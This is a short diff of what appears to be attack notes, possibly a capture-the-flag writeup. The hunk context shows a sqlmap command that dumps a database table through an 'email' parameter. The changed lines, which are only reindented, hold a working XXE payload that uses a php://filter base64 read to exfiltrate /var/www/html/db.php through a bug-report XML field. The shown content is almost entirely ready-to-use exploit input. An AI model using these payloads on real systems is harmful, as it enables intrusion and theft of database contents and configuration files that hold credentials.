@@ -54,12 +54,11 @@ sqlmap -r reset.req -p email --batch --level 3 -D <db name> -T <table name> --du
 
 ### To Get PHP File
 
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE data [
-<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
-<bugreport>
-<title>test</title>
- <cwe>test</cwe>
- <cvss>test</cvss>
- <reward>&file;</reward>
-</bugreport>
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
+		<bugreport>
+		<title>test</title>
+ 		<cwe>test</cwe>
+ 		<cvss>test</cvss>
+	 	<reward>&file;</reward>
+		</bugreport>
